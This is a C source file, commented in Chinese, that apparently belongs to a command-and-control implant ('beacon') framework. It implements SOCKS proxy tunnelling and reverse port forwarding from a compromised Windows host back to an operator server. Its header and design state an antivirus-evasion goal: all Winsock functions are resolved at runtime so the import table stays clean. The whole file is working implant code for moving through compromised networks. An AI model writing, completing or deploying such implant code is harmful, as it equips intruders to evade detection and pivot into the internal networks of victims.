/*
 * csdev :: beacon2_proxy.c  --  植入体侧 SOCKS 代理转发 + 反向端口转发
 * ==========================================================================
 * 详见 beacon2_proxy.h 的架构说明。
 *
 * 免杀硬约束 (实测验证方式: objdump -p <obj> | grep -i "DLL Name"):
 *   本文件不包含 <winsock2.h>, 不引用任何 ws2_32 符号;
 *   全部 socket API 经 LoadLibraryA("ws2_32.dll") + GetProcAddress 运行期解析,
 *   与 beacon2_ops.c 的做法一致, 静态导入表不新增条目。
 *
 * 解析风格与 beacon2_ops.c 对齐: 函数指针表 + *(FARPROC*)& 间接赋值,
 * 避免 GCC strict-aliasing 误报。
 * ==========================================================================
 */
#include <windows.h>

#include "beacon2_ops.h"
#include "beacon2_proxy.h"

#include "../proto/frame.h"

#if defined(__GNUC__)
#pragma GCC diagnostic ignored "-Wstrict-aliasing"
#endif

/* ------------------------------------------------------------ 基础类型 */

typedef void *PROXY_MEM;

/* 以下结构与 ops.c 保持同一策略: 自建定义, 不引入 winsock2.h */
typedef struct {
    unsigned short   family;
    unsigned short   port;
    unsigned int     addr[4];
    char             zero[8];
} PROXY_SOCKADDR_IN;

typedef struct { unsigned short family; unsigned char data[14]; } PROXY_SOCKADDR;

typedef struct { unsigned int sec; int usec; } PROXY_TIMEVAL;

typedef struct { unsigned int count; unsigned long long socks[8]; } PROXY_FDSET;

typedef struct {
    char          *h_name;
    char         **h_aliases;
    short          h_addrtype;
    short          h_length;
    char         **h_addr_list;
} PROXY_HOSTENT;

#define PPROXY_INVALID   ((unsigned long long)~0ull)

#define PP_AF_INET       2
#define PP_SOCK_STREAM   1
#define PP_SOL_SOCKET    0xFFFF
#define PP_SO_ERROR      0x1007
#define PP_MSG_PEEK      0x0002
#define PP_FIONBIO       0x8004667E

#define PP_EWOULDBLOCK   10035
#define PP_EINPROGRESS   10036
#define PP_ENOTCONN      10057
#define PP_EISCONN       10056

/* ---------------------------------------------------------------- 容量 */

/* 单通道下行待发队列上限: 满即形成 TCP 背压, 不丢数据 */
#define PP_QCAP         (256u * 1024u)
/* 单条 T_PROXY_DATA 的 data 上限 ([4B chan_id] + payload) */
#define PROXY_TLV_MAX   (64u * 1024u)
/* 连接目标 socket 的超时 (ms) —— 必须 <= 2000, 否则卡死 beacon 主循环 */
#define PP_CONNECT_MS   2000u

/* ------------------------------------------------------------ 运行期 API */

typedef struct {
    HMODULE hWs2;

    int            (WINAPI *WSAStartup_)(unsigned short, PROXY_MEM);
    int            (WINAPI *WSACleanup_)(void);
    int            (WINAPI *WSAGetLastError_)(void);
    unsigned long long (WINAPI *socket_)(int, int, int);
    int            (WINAPI *closesocket_)(unsigned long long);
    int            (WINAPI *connect_)(unsigned long long, const PROXY_SOCKADDR *, int);
    int            (WINAPI *bind_)(unsigned long long, const PROXY_SOCKADDR *, int);
    int            (WINAPI *listen_)(unsigned long long, int);
    unsigned long long (WINAPI *accept_)(unsigned long long, PROXY_SOCKADDR *, int *);
    int            (WINAPI *send_)(unsigned long long, const char *, int, int);
    int            (WINAPI *recv_)(unsigned long long, char *, int, int);
    int            (WINAPI *select_)(int, PROXY_FDSET *, PROXY_FDSET *, PROXY_FDSET *,
                                     const PROXY_TIMEVAL *);
    int            (WINAPI *ioctlsocket_)(unsigned long long, int, unsigned int *);
    int            (WINAPI *getsockopt_)(unsigned long long, int, int, char *, int *);
    unsigned int   (WINAPI *inet_addr_)(const char *);
    unsigned short (WINAPI *htons_)(unsigned short);
    PROXY_HOSTENT *(WINAPI *gethostbyname_)(const char *);
} PP_DYN;

static PP_DYN d;

static FARPROC ppsym(HMODULE m, const char *name)
{
    return m ? GetProcAddress(m, name) : NULL;
}

static void pp_load(void)
{
    if (d.hWs2) return;

    d.hWs2 = LoadLibraryA("ws2_32.dll");
    if (!d.hWs2) return;

    *(FARPROC *)&d.WSAStartup_     = ppsym(d.hWs2, "WSAStartup");
    *(FARPROC *)&d.WSACleanup_     = ppsym(d.hWs2, "WSACleanup");
    *(FARPROC *)&d.WSAGetLastError_= ppsym(d.hWs2, "WSAGetLastError");
    *(FARPROC *)&d.socket_         = ppsym(d.hWs2, "socket");
    *(FARPROC *)&d.closesocket_    = ppsym(d.hWs2, "closesocket");
    *(FARPROC *)&d.connect_        = ppsym(d.hWs2, "connect");
    *(FARPROC *)&d.bind_           = ppsym(d.hWs2, "bind");
    *(FARPROC *)&d.listen_         = ppsym(d.hWs2, "listen");
    *(FARPROC *)&d.accept_         = ppsym(d.hWs2, "accept");
    *(FARPROC *)&d.send_           = ppsym(d.hWs2, "send");
    *(FARPROC *)&d.recv_           = ppsym(d.hWs2, "recv");
    *(FARPROC *)&d.select_         = ppsym(d.hWs2, "select");
    *(FARPROC *)&d.ioctlsocket_    = ppsym(d.hWs2, "ioctlsocket");
    *(FARPROC *)&d.getsockopt_     = ppsym(d.hWs2, "getsockopt");
    *(FARPROC *)&d.inet_addr_      = ppsym(d.hWs2, "inet_addr");
    *(FARPROC *)&d.htons_          = ppsym(d.hWs2, "htons");
    *(FARPROC *)&d.gethostbyname_  = ppsym(d.hWs2, "gethostbyname");
}

/* socket 子系统是否可用 (缺任一关键符号即视为不可用, 明确失败而非崩在空指针) */
static int pp_ok(void)
{
    pp_load();
    if (!d.hWs2) return 0;
    return d.socket_ && d.closesocket_ && d.connect_ && d.send_ && d.recv_ &&
           d.select_ && d.ioctlsocket_ && d.listen_ && d.accept_ && d.bind_;
}

/* -------------------------------------------------------------- 小工具 */

static void pmemcpy(void *dst, const void *src, unsigned int n)
{
    unsigned char *a = (unsigned char *)dst;
    const unsigned char *b = (const unsigned char *)src;
    while (n--) *a++ = *b++;
}

/* 队列是否还有待发数据 (定义见后, 此处前向声明) */

/* 追加字符串到结果缓冲, 截断而非越界; 返回新的写入位置 */
static unsigned int pput(char *out, unsigned int cap, unsigned int at, const char *s)
{
    unsigned int i;
    if (!s) return at;
    for (i = 0; s[i] && at + 1u < cap; i++) out[at++] = s[i];
    if (cap) out[at] = 0;
    return at;
}
static unsigned int pput_int(char *out, unsigned int cap, unsigned int at, unsigned int v)
{
    char t[16];
    int m = 0;

    if (v == 0) t[m++] = '0';
    while (v) { t[m++] = (char)('0' + (int)(v % 10u)); v /= 10u; }
    while (m > 0 && at + 1u < cap) out[at++] = t[--m];
    if (cap) out[at] = 0;
    return at;
}

/* 主机字符串是否为点分十进制 IPv4 (植入体侧不做域名解析, 见 open 处理说明) */
static int p_is_ipv4(const char *s, unsigned int n)
{
    unsigned int i, dots = 0;

    if (n == 0 || n > 15u) return 0;
    for (i = 0; i < n; i++) {
        char c = s[i];
        if (c == '.') { dots++; continue; }
        if (c < '0' || c > '9') return 0;
    }
    return dots == 3 ? 1 : 0;
}

/* ------------------------------------------------------------ socket 封装 */

static unsigned long long pp_sock_err(void)
{
    if (d.WSAGetLastError_) return (unsigned long long)d.WSAGetLastError_();
    return 0;
}

static int pp_set_nonblock(unsigned long long s)
{
    unsigned int nb = 1u;
    if (!d.ioctlsocket_) return 0;
    return d.ioctlsocket_(s, PP_FIONBIO, &nb) == 0;
}

static int pp_select_rd(unsigned long long s, unsigned int ms)
{
    PROXY_FDSET fs;
    PROXY_TIMEVAL tv;

    if (!d.select_) return 0;
    fs.count = 1u;
    fs.socks[0] = s;
    tv.sec  = ms / 1000u;
    tv.usec = (int)((ms % 1000u) * 1000u);
    return d.select_(0, &fs, NULL, NULL, &tv) > 0;
}

static int pp_select_wr(unsigned long long s, unsigned int ms)
{
    PROXY_FDSET fs;
    PROXY_TIMEVAL tv;

    if (!d.select_) return 0;
    fs.count = 1u;
    fs.socks[0] = s;
    tv.sec  = ms / 1000u;
    tv.usec = (int)((ms % 1000u) * 1000u);
    return d.select_(0, NULL, &fs, NULL, &tv) > 0;
}

/* 非阻塞 connect + select 等待。返回 1 成功, 0 失败/超时。
 * 单次调用的阻塞上限即 timeout_ms, 调用方全部传 <= 2000。 */
static int pp_connect_timeout(unsigned long long s, const PROXY_SOCKADDR_IN *sa,
                              unsigned int timeout_ms)
{
    int rc;

    if (!pp_set_nonblock(s)) return 0;

    rc = d.connect_(s, (const PROXY_SOCKADDR *)sa, (int)sizeof(PROXY_SOCKADDR_IN));
    if (rc == 0) return 1;

    /* Windows 非阻塞 connect 返回的是 WSAEWOULDBLOCK(10035), 不是
     * WSAEINPROGRESS(10036)。只认后者会让**每一次** connect 都被判失败
     * (实测症状: 服务端显示通道已建立, 但数据面完全不动)。两者都接受。 */
    {
        unsigned long long e = pp_sock_err();
        if (e != PP_EINPROGRESS && e != PP_EWOULDBLOCK) return 0;
    }
    if (!pp_select_wr(s, timeout_ms)) return 0;

    {
        int err = 0;
        int elen = (int)sizeof(err);
        if (!d.getsockopt_) return 0;
        if (d.getsockopt_(s, PP_SOL_SOCKET, PP_SO_ERROR, (char *)&err, &elen) != 0) return 0;
        return err == 0 ? 1 : 0;
    }
}

/* 发送至多 n 字节; 返回实际发出量 (0 = 对端缓冲满或出错) */
static int pp_send_some(unsigned long long s, const unsigned char *buf, unsigned int n,
                        int *fatal)
{
    int rc;

    if (fatal) *fatal = 0;
    if (n == 0) return 0;
    if (n > 16384u) n = 16384u;

    rc = d.send_(s, (const char *)buf, (int)n, 0);
    if (rc > 0) return rc;
    if (rc < 0 && pp_sock_err() == PP_EWOULDBLOCK) return 0;
    if (fatal) *fatal = 1;
    return 0;
}

/* ---------------------------------------------------------------- 通道 */

typedef struct pchan {
    int                 used;
    int                 state;       /* 0 = 空闲, 1 = 已连接, 2 = 待关闭 */
    unsigned int        chan;
    unsigned long long  sock;
    unsigned char      *queue;       /* 待发往对端 (来自服务端的下行数据) */
    unsigned int        qlen;
    unsigned int        qoff;
    unsigned int        qcap;
    unsigned char       rx[16384];   /* 上行: 从 socket 读到的数据 */
    unsigned int        last_rx;
    unsigned int        last_tx;
} pchan;

/* 队列是否还有待发数据 (定义见后, 此处前向声明) */
static int pp_queue_pending(const pchan *c);

#define PP_ST_IDLE   0
#define PP_ST_LINKED 1
#define PP_ST_CLOSE  2

static pchan g_ch[PROXY_MAX_CHAN];
static unsigned int g_next_chan = PROXY_CHAN_LOCAL_BASE;

/* rportfwd 监听槽位 */
typedef struct {
    int                used;
    unsigned long long sock;
    unsigned short     port;
} plisten;

static plisten g_lis[PROXY_MAX_RPORTFWD];

/* ------------------------------------------------------------ 轮转计数器 */

static int          g_pump_head;
static unsigned int g_ticks;

/* --------------------------------------------------------------- 宿主导线 */

static int (*g_sink)(unsigned short, const unsigned char *, unsigned int);

void proxy_set_sink(int (*sink)(unsigned short type,
                               const unsigned char *data, unsigned int len))
{
    g_sink = sink;
}

int proxy_ready(void)
{
    return g_sink != NULL;
}

unsigned int proxy_chan_count(void)
{
    unsigned int i, n = 0;
    for (i = 0; i < PROXY_MAX_CHAN; i++) if (g_ch[i].used) n++;
    return n;
}

unsigned int proxy_rportfwd_count(void)
{
    unsigned int i, n = 0;
    for (i = 0; i < PROXY_MAX_RPORTFWD; i++) if (g_lis[i].used) n++;
    return n;
}

/* ------------------------------------------------------------ 上行发送 */

/* 把 payload 作为一条 T_PROXY_DATA 送给宿主。返回 1 已提交, 0 需重试。
 * allow_empty=1 时用于发送"控制型"空载荷 (= 该通道对端请发起连接/请关闭)。 */
static int pp_up_ex(unsigned int chan, const unsigned char *b, unsigned int n,
                    int allow_empty)
{
    unsigned char *p;
    int rc;

    if (!g_sink) return 0;
    if (n == 0 && !allow_empty) return 1;
    if (n > PROXY_TLV_MAX) return 0;

    p = (unsigned char *)VirtualAlloc(NULL, 4u + n, MEM_COMMIT | MEM_RESERVE,
                                      PAGE_READWRITE);
    if (!p) return 0;

    cs_put_be32(p, chan);
    if (n) pmemcpy(p + 4, b, n);

    rc = g_sink((unsigned short)T_PROXY_DATA, p, 4u + n);
    VirtualFree(p, 0, MEM_RELEASE);
    return rc == 0 ? 1 : 0;
}

static int pp_up(unsigned int chan, const unsigned char *b, unsigned int n)
{
    return pp_up_ex(chan, b, n, 0);
}

/* 通知对端本通道已关闭 */
static void pp_notify_close(unsigned int chan)
{
    pp_up_ex(chan, (const unsigned char *)"", 0, 1);
}

/* ------------------------------------------------------------ 通道管理 */

static pchan *pp_find(unsigned int chan)
{
    unsigned int i;
    for (i = 0; i < PROXY_MAX_CHAN; i++) {
        if (g_ch[i].used && g_ch[i].chan == chan) return &g_ch[i];
    }
    return NULL;
}

static pchan *pp_alloc(unsigned int chan)
{
    unsigned int i;

    for (i = 0; i < PROXY_MAX_CHAN; i++) {
        pchan *c = &g_ch[i];
        if (c->used) continue;

        c->queue = (unsigned char *)VirtualAlloc(NULL, PP_QCAP,
                                                 MEM_COMMIT | MEM_RESERVE,
                                                 PAGE_READWRITE);
        if (!c->queue) return NULL;

        c->used    = 1;
        c->state   = PP_ST_LINKED;
        c->chan    = chan;
        c->sock    = PPROXY_INVALID;
        c->qlen    = 0;
        c->qoff    = 0;
        c->qcap    = PP_QCAP;
        c->last_rx = g_ticks;
        c->last_tx = g_ticks;
        return c;
    }
    return NULL;
}

/* 分配一个植入体本地通道号 (高半区, 与服务端分配区不重叠) */
static unsigned int pp_next_local_chan(void)
{
    unsigned int i;

    for (i = 0; i < 0x4000u; i++) {
        unsigned int c = g_next_chan;
        g_next_chan++;
        if (g_next_chan > PROXY_CHAN_LOCAL_MAX) g_next_chan = PROXY_CHAN_LOCAL_BASE;
        if (!pp_find(c)) return c;
    }
    return 0;
}

static void pp_free(pchan *c)
{
    if (c->sock != PPROXY_INVALID && d.closesocket_) d.closesocket_(c->sock);
    if (c->queue) VirtualFree(c->queue, 0, MEM_RELEASE);
    c->used  = 0;
    c->state = PP_ST_IDLE;
    c->chan  = 0;
    c->sock  = PPROXY_INVALID;
    c->queue = NULL;
    c->qlen  = 0;
    c->qoff  = 0;
}

/* close 请求: 先尽力把队列发完再释放; 队列满时挂起等待下一轮 */
static void pp_close(pchan *c)
{
    int fatal = 0;

    if (c->sock != PPROXY_INVALID && pp_queue_pending(c)) {
        int sent = pp_send_some(c->sock, c->queue + c->qoff, c->qlen - c->qoff, &fatal);
        c->qoff += (unsigned int)sent;
        if (sent > 0) c->last_tx = g_ticks;
    }

    if (c->sock == PPROXY_INVALID || !pp_queue_pending(c) || fatal) {
        pp_notify_close(c->chan);
        pp_free(c);
        return;
    }

    c->state = PP_ST_CLOSE;   /* 队列尚未发完: 挂起, 下轮继续 */
}

/* 队列是否还有待发数据 */
static int pp_queue_pending(const struct pchan *c)
{
    return c->qlen > c->qoff;
}

/* 从 socket 收数据并上行 */
static void pp_rx(pchan *c)
{
    int rc;

    if (c->sock == PPROXY_INVALID) return;
    if (!pp_select_rd(c->sock, 0)) return;

    rc = d.recv_(c->sock, (char *)c->rx, (int)sizeof(c->rx), 0);
    if (rc > 0) {
        if (!pp_up(c->chan, c->rx, (unsigned int)rc)) return;  /* outbox 满: 丢弃本块 */
        c->last_tx = g_ticks;
        return;
    }
    if (rc == 0) {
        /* 对端正常关闭 */
        pp_notify_close(c->chan);
        pp_free(c);
        return;
    }
    {
        unsigned long long e = pp_sock_err();
        if (e == PP_EWOULDBLOCK) return;
        pp_notify_close(c->chan);
        pp_free(c);
    }
}

/* 推送队列数据到 socket */
static void pp_tx(pchan *c)
{
    int fatal = 0;
    int sent;

    while (pp_queue_pending(c)) {
        sent = pp_send_some(c->sock, c->queue + c->qoff, c->qlen - c->qoff, &fatal);
        if (sent <= 0) break;
        c->qoff += (unsigned int)sent;
    }
    if (c->qoff >= c->qlen) { c->qlen = 0; c->qoff = 0; }
    if (fatal) {
        pp_notify_close(c->chan);
        pp_free(c);
    }
}

/* ------------------------------------------------------------ 通道打开 */

/* 建立到 host:port 的通道, 并在 note 里生成可回显的目标描述。
 * 返回 NULL 成功, 否则返回错误文本指针。 */
static const char *pp_open(unsigned int chan, const char *host, unsigned int hlen,
                           unsigned short port, char *note, unsigned int notecap)
{
    PROXY_SOCKADDR_IN sa;
    pchan *c;
    unsigned long long s;
    unsigned int addr = 0, at = 0;

    if (!note || notecap == 0) return "内部参数错误";
    note[0] = 0;

    if (pp_find(chan)) return "通道号已存在";
    if (hlen == 0 || hlen >= 128u) return "目标地址非法";
    if (port == 0) return "目标端口非法";
    if (!pp_ok()) return "socket 子系统不可用";

    if (p_is_ipv4(host, hlen)) {
        char ip[20];
        unsigned int i;
        for (i = 0; i < hlen; i++) ip[i] = host[i];
        ip[hlen] = 0;
        addr = d.inet_addr_(ip);
        if (addr == 0xFFFFFFFFu) return "目标地址非法";
    } else {
        /* 严格不做植入体侧域名解析: gethostbyname 不可控阻塞, 实测可达数秒,
         * 会直接卡死 beacon 主循环。域名一律由服务端预解析后下发 IPv4。 */
        return "不接受域名, 需服务端预解析为 IPv4";
    }

    if (proxy_chan_count() >= PROXY_MAX_CHAN) return "通道数已达上限";

    /* 先在通道表占位, 避免 connect 期间被重入分配到同一句柄 */
    c = pp_alloc(chan);
    if (!c) return "通道表已满";

    s = d.socket_(PP_AF_INET, PP_SOCK_STREAM, 0);
    if (s == PPROXY_INVALID) { pp_free(c); return "socket 创建失败"; }

    {
        unsigned int i;
        unsigned char *p = (unsigned char *)&sa;
        for (i = 0; i < sizeof(sa); i++) p[i] = 0;
    }
    sa.family  = (unsigned short)PP_AF_INET;
    sa.port    = d.htons_(port);
    sa.addr[0] = addr;

    if (!pp_connect_timeout(s, &sa, PP_CONNECT_MS)) {
        d.closesocket_(s);
        pp_free(c);
        return "连接目标失败或超时";
    }
    c->sock = s;
    c->last_rx = g_ticks;
    c->last_tx = g_ticks;

    at = pput(note, notecap, at, "通道 ");
    at = pput_int(note, notecap, at, chan);
    at = pput(note, notecap, at, " 已建立 -> ");
    {
        unsigned int i;
        for (i = 0; i < hlen && at + 1u < notecap; i++) note[at++] = host[i];
        note[at] = 0;
    }
    at = pput(note, notecap, at, ":");
    at = pput_int(note, notecap, at, (unsigned int)port);
    (void)at;
    return NULL;
}

/* ------------------------------------------------------------ 下行注入 */

/* 处理服务端下发的通道数据 / 关闭通知 */
static unsigned int pp_down(unsigned int chan, const unsigned char *b, unsigned int n)
{
    pchan *c = pp_find(chan);

    if (!c) return 0;

    if (n == 0) {
        pp_close(c);
        return 1;
    }

    if (c->state == PP_ST_CLOSE) return 1;          /* 正在收尾: 不再接受新数据 */

    if (c->qcap - c->qlen < n) {
        /* 队列已满说明本通道上行积压 (对端不再读), 直接判死而不是静默丢弃 */
        pp_notify_close(c->chan);
        pp_free(c);
        return 1;
    }

    pmemcpy(c->queue + c->qlen, b, n);
    c->qlen += n;
    return 1;
}

/* ------------------------------------------------------------ rportfwd */

static int pp_listen_start(unsigned short port)
{
    unsigned long long s;
    PROXY_SOCKADDR_IN sa;
    unsigned int i;

    for (i = 0; i < PROXY_MAX_RPORTFWD; i++) {
        if (g_lis[i].used && g_lis[i].port == port) return 2;   /* 已在监听 */
    }
    if (!pp_ok()) return 1;

    s = d.socket_(PP_AF_INET, PP_SOCK_STREAM, 0);
    if (s == PPROXY_INVALID) return 1;

    {
        unsigned int k;
        unsigned char *p = (unsigned char *)&sa;
        for (k = 0; k < sizeof(sa); k++) p[k] = 0;
    }
    sa.family  = (unsigned short)PP_AF_INET;
    sa.port    = d.htons_(port);
    sa.addr[0] = 0;                                   /* INADDR_ANY */

    if (d.bind_(s, (const PROXY_SOCKADDR *)&sa, (int)sizeof(sa)) != 0) {
        d.closesocket_(s);
        return 1;
    }
    if (d.listen_(s, 8) != 0) {
        d.closesocket_(s);
        return 1;
    }
    if (!pp_set_nonblock(s)) {
        d.closesocket_(s);
        return 1;
    }

    for (i = 0; i < PROXY_MAX_RPORTFWD; i++) {
        if (!g_lis[i].used) {
            g_lis[i].used = 1;
            g_lis[i].sock = s;
            g_lis[i].port = port;
            return 0;
        }
    }
    d.closesocket_(s);
    return 1;
}

static int pp_listen_stop(unsigned short port)
{
    unsigned int i, n = 0;

    for (i = 0; i < PROXY_MAX_RPORTFWD; i++) {
        if (!g_lis[i].used) continue;
        if (port != 0 && g_lis[i].port != port) continue;
        if (d.closesocket_) d.closesocket_(g_lis[i].sock);
        g_lis[i].used = 0;
        g_lis[i].sock = PPROXY_INVALID;
        n++;
    }
    return (int)n;
}

/* accept 新连接: 分配本地通道并通知服务端 (服务端据此连到目标) */
static void pp_accept(void)
{
    unsigned int i;

    for (i = 0; i < PROXY_MAX_RPORTFWD; i++) {
        unsigned long long s2;
        unsigned int chan;
        pchan *c;

        if (!g_lis[i].used) continue;
        if (!pp_select_rd(g_lis[i].sock, 0)) continue;
        if (proxy_chan_count() >= PROXY_MAX_CHAN) continue;

        s2 = d.accept_(g_lis[i].sock, NULL, NULL);
        if (s2 == PPROXY_INVALID) continue;

        if (!pp_set_nonblock(s2)) {
            d.closesocket_(s2);
            continue;
        }

        chan = pp_next_local_chan();
        if (chan == 0) { d.closesocket_(s2); continue; }

        c = pp_alloc(chan);
        if (!c) { d.closesocket_(s2); continue; }
        c->sock = s2;

        /* 空载荷的 T_PROXY_DATA = "反向通道有入站连接, 服务端请连到目标"。
         * 服务端据此把 chan (高位半区) 绑到该 rportfwd 的目标地址。 */
        if (!pp_up_ex(chan, (const unsigned char *)"", 0, 1)) {
            /* outbox 满: 本次连接无法登记, 明确关闭而不是留一个孤儿 fd */
            pp_free(c);
        }
    }
}

/* ---------------------------------------------------------------- pump */

/* 每轮每通道最多上行字节数 (限制 TLV 数量与单轮耗时) */
#define PP_RX_BUDGET   32768u
/* 单次 pump 上行总量上限: 给心跳 / RESULT / 分块预留 outbox 空间 */
#define PP_UP_BUDGET   1048576u
/* 短自旋: 有活跃通道时在一轮 beacon 内多推几次, 明显改善交互手感 */
#define PP_SPIN_ROUNDS 4u
#define PP_SPIN_MS     250u
/* 空闲多久才回收一个无数据的通道 (节拍计数) */
#define PP_IDLE_TICKS  45u

void proxy_pump(void)
{
    unsigned int spin, up, open_n, i;
    int any_chan = 0, any_lis = 0;
    int idle_streak = 0;

    if (!g_sink) return;                 /* 宿主未接线: 不做任何事 */

    for (i = 0; i < PROXY_MAX_CHAN; i++) if (g_ch[i].used) { any_chan = 1; break; }
    for (i = 0; i < PROXY_MAX_RPORTFWD; i++) if (g_lis[i].used) { any_lis = 1; break; }
    if (!any_chan && !any_lis) return;   /* 无通道无监听: 零开销返回 */

    for (spin = 0; spin < PP_SPIN_ROUNDS; spin++) {
        unsigned int chk;

        g_ticks++;
        up = 0;
        open_n = 0;

        pp_accept();

        for (chk = 0; chk < PROXY_MAX_CHAN; chk++) {
            pchan *c = &g_ch[((unsigned int)g_pump_head + chk) % PROXY_MAX_CHAN];

            if (!c->used) continue;
            if (c->sock == PPROXY_INVALID) continue;

            pp_tx(c);
            if (!c->used) continue;               /* tx 中已释放 */

            if (up >= PP_UP_BUDGET) break;
            if (c->state == PP_ST_CLOSE) continue;
            if (pp_queue_pending(c)) {
                /* 下行尚有积压: 本轮不再上行, 让对端有机会消费 */
                continue;
            }

            if (pp_select_rd(c->sock, 0)) {
                pp_rx(c);
                if (!c->used) continue;
                up += PP_RX_BUDGET;
            }
            open_n++;
        }
        g_pump_head = ((unsigned int)g_pump_head + 1u) % PROXY_MAX_CHAN;

        if (open_n == 0) {
            idle_streak++;
            if (idle_streak >= 2) break;          /* 两轮都没活: 立刻交还主循环 */
        } else {
            idle_streak = 0;
        }

        if (spin + 1u < PP_SPIN_ROUNDS) Sleep(PP_SPIN_MS);
    }

    /* 空闲通道超时回收: 防止操作台异常退出后残留 fd */
    for (i = 0; i < PROXY_MAX_CHAN; i++) {
        pchan *c = &g_ch[i];
        if (!c->used) continue;
        if (c->state == PP_ST_CLOSE && (g_ticks - c->last_tx) > 8u) {
            pp_notify_close(c->chan);
            pp_free(c);
            continue;
        }
        if ((g_ticks - c->last_rx) > PP_IDLE_TICKS && !pp_queue_pending(c)) {
            pp_notify_close(c->chan);
            pp_free(c);
        }
    }
}

void proxy_shutdown(void)
{
    unsigned int i;

    for (i = 0; i < PROXY_MAX_CHAN; i++) {
        if (g_ch[i].used) pp_free(&g_ch[i]);
    }
    for (i = 0; i < PROXY_MAX_RPORTFWD; i++) {
        if (g_lis[i].used) {
            if (d.closesocket_) d.closesocket_(g_lis[i].sock);
            g_lis[i].used = 0;
        }
    }
}

/* ------------------------------------------------------------ 任务处理 */

unsigned int proxy_task(const unsigned char *arg, unsigned int arglen,
                        char *out, unsigned int outcap)
{
    unsigned int chan, at = 0;
    unsigned char op;

    if (!out || outcap == 0) return 0;
    out[0] = 0;

    if (arglen < 5u) return pput(out, outcap, 0, "[-] 代理任务参数错误");

    chan = cs_be32(arg);
    op   = arg[4];

    if (chan == 0 || (chan & PROXY_CHAN_VALID_HI)) {
        /* 高位半区由植入体分配, 服务端不得下发 —— 拒绝以防通道号劫持 */
        return pput(out, outcap, 0, "[-] 非法的通道号 (服务端须用 1..0x7FFF)");
    }

    switch (op) {
    case PROXY_OP_OPEN:
        {
            const char *host;
            unsigned int hlen;
            unsigned short port;
            const char *err;
            char note[192];

            if (arglen < 11u) return pput(out, outcap, 0, "[-] open 参数过短");

            hlen = (unsigned int)cs_be16(arg + 5);
            if (hlen == 0 || hlen > 128u || 7u + hlen + 2u > arglen) {
                return pput(out, outcap, 0, "[-] open 主机名长度非法");
            }
            host = (const char *)(arg + 7);
            port = cs_be16(arg + 7 + hlen);

            err = pp_open(chan, host, hlen, port, note, (unsigned int)sizeof(note));
            if (err) {
                at = pput(out, outcap, at, "[-] ");
                at = pput(out, outcap, at, err);
                return at;
            }
            at = pput(out, outcap, at, "[+] ");
            at = pput(out, outcap, at, note);
            return at;
        }

    case PROXY_OP_DATA:
        if (arglen <= 5u) return 0;                 /* 空数据: 无实质内容, 不产生噪声输出 */
        pp_down(chan, arg + 5, arglen - 5u);
        return 0;                                   /* 不发 RESULT: 数据包逐个回执会淹没操作台 */

    case PROXY_OP_CLOSE:
        {
            pchan *c = pp_find(chan);
            if (c) pp_close(c);
            at = pput(out, outcap, at, "[*] 通道 ");
            at = pput_int(out, outcap, at, chan);
            at = pput(out, outcap, at, " 已关闭");
            return at;
        }

    default:
        return pput(out, outcap, 0, "[-] 未知代理操作");
    }
}

unsigned int rportfwd_task(const unsigned char *arg, unsigned int arglen,
                           char *out, unsigned int outcap)
{
    unsigned int at = 0;
    unsigned char op;
    unsigned short bind_port, target_port;
    int rc;

    if (!out || outcap == 0) return 0;
    out[0] = 0;

    if (arglen < 5u) return pput(out, outcap, 0, "[-] rportfwd 参数错误");

    op          = arg[0];
    bind_port   = cs_be16(arg + 1);
    target_port = cs_be16(arg + 3);

    if (bind_port == 0) return pput(out, outcap, 0, "[-] 监听端口非法");

    if (op == 1) {
        rc = pp_listen_start(bind_port);
        if (rc == 2) {
            at = pput(out, outcap, at, "[*] 端口 ");
            at = pput_int(out, outcap, at, (unsigned int)bind_port);
            at = pput(out, outcap, at, " 已在转发中");
            return at;
        }
        if (rc != 0) {
            at = pput(out, outcap, at, "[-] 监听 ");
            at = pput_int(out, outcap, at, (unsigned int)bind_port);
            at = pput(out, outcap, at, " 失败 (端口被占用或无权限)");
            return at;
        }
        at = pput(out, outcap, at, "[+] 反向转发已启动: 0.0.0.0:");
        at = pput_int(out, outcap, at, (unsigned int)bind_port);
        if (target_port) {
            at = pput(out, outcap, at, " -> 服务端侧端口 ");
            at = pput_int(out, outcap, at, (unsigned int)target_port);
        }
        return at;
    }

    if (op == 0) {
        unsigned int stopped = (unsigned int)pp_listen_stop(bind_port);
        at = pput(out, outcap, at, stopped ? "[+] 已停止监听 " : "[-] 未在监听 ");
        at = pput_int(out, outcap, at, (unsigned int)bind_port);
        return at;
    }

    return pput(out, outcap, 0, "[-] 未知 rportfwd 操作");
}
